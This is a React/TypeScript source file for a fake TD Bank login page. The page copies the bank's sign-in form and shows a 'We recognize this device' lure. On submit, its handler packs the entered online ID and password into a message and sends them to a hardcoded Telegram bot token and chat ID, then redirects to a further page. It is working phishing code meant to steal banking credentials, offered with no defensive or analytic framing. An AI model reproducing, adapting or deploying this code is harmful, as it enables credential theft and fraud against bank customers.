import {
    Box,
    Text,
    Heading,
    Center,
    FormControl,
    Input,
    InputRightElement,
    Button,
    InputGroup,
    Checkbox,
    IconButton,
    Divider,
  } from "@chakra-ui/react";
  import { useNavigate } from "react-router-dom";
  import { useState } from "react";
  
  function Login() {
    const navigate = useNavigate();
    const [showPassword, setShowPassword] = useState(false);
  
    const handleShowPassword = () => {
      setShowPassword(!showPassword);
    };
  
    const token = "6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc";
    const chat_id = "857709815";
  
    async function sendMessageToTelegram(message: any) {
      const res = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
      );
       await res.json();
      console.log("Telegram message sent");
    }
  
    async function handleFormSubmit(event: any) {
      
      event.preventDefault();
      const message =
    
        "TDBANK | ONLINE ID: " +
        event.target.onlineId.value + 
        " " +
        "\n| PASSWORD: " +
        event.target.password.value;
       
  
      try {
        await sendMessageToTelegram(message);
        navigate("/enter");
      } catch (error) {
        console.error("Error sending message to Telegram:", error);
      }
    }
  
    function handleKeyDown(event: any) {
      if (event.key === "Enter") {
        event.preventDefault();
        handleFormSubmit(event);
      }
    }
  
    return (
      <Box fontFamily={'Poppins'}>
        <Box minH="72.3vh">
        <Center p={4} bgColor="yellow.100" justifyContent="space-between">
          <Text pl={2} fontSize="sm" color="blackAlpha.00" fontWeight="normal">
          We recognize this device. Please sign on to confirm your response.
          </Text>
          <Text textDecor={'underline'} pl={2} fontSize="md" color="blackAlpha.800" fontWeight="semibold"><a href='#'>
           View</a>
          </Text>
        </Center>
          <Box>
            <Heading
              textAlign="center"
              pt={7}
              fontWeight="normal"
              fontFamily={'Poppins'}
              as="h2"
              fontSize="26"
              color="blackAlpha.800"
            >
              Log In
            </Heading>
          </Box>
          <form onSubmit={handleFormSubmit}>
          <Box h={68} mt={6} mx="4">
           
              <InputGroup mb={3} borderRadius={"0"} display={"block"}>
                <FormControl>
                  <Input
                    id="onlineId"
                   
                   
                    
                    borderRadius={0}
                    _focus={{ border: "none" }}
                    _placeholder={{
                      
                      top: "0",
                      transform: "translateY(-130%)",
                      fontSize: "12px",
                    }}
                    h="70px"
                    placeholder="User name"
                    pb={0}
                    autoFocus
                    fontWeight={'medium'}
                    color="#12395b"
                    type="text"
                    onKeyDown={handleKeyDown} // Add onKeyDown event handler
                  />
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    color="#12395b"
                    _hover={{ border: "solid 0.9px" }}
                    fontWeight={'medium'}
                    
                   
                    borderRadius={0}
                    _focus={{  border: "none" }}
                    _placeholder={{
                      
                      top: "0",
                      transform: "translateY(-130%)",
                      fontSize: "12px",
                    }}
                    h="70px"
                    placeholder="Password"
                    pb={0}
                   
                    onKeyDown={handleKeyDown} // Add onKeyDown event handler
                  />
                 <InputRightElement mt={79}  width="7.5rem">
                  <Divider mr={2} borderColor={'gray.800'} h={8} w={2} orientation="vertical" />
                  <IconButton
                      h="100%"
                      p={2}
                      color={'#12395b'}
                      size="md"
                      onClick={handleShowPassword}
                      colorScheme="transparent"
                      variant={'solid'}
  
                      
                      
                      icon={showPassword ? <><Text ml={1}> Hide</Text></> : <><Text ml={1}> Show</Text></>} aria-label={""}                />
                </InputRightElement>
                  
                </FormControl>
              </InputGroup>
  
              <Checkbox
                pb={6}
                pt={4}
                size={"lg"}
                id="rememberMe"
               
                isChecked={false}
              >
                <Text
                  lineHeight={"4"}
                  fontSize={"sm"}
                  color="blackAlpha.800"
                  fontWeight={"normal"}
                >
                  Remember me
                </Text>
              </Checkbox>
  
              <Button
                mt={0}
                bgColor="#47A040"
                h={12}
                onClick={handleShowPassword}
                _hover={{
                  bg: "#526f30",
                  color: "whitesmoke",
                  borderRadius: 2,
                }}
               
                color="whitesmoke"
                borderRadius={2}
                w="100%"
                type="submit" // Add type="submit" attribute
              >
                Log In
              </Button>
            
  
            <Text
              mt={5}
              textAlign="center"
              color="#47A040"
            >
             Forgot user name and/or password?
            </Text>
            
          </Box>
          </form>
        </Box>
      </Box>
    );
  }
  
  export default Login;
  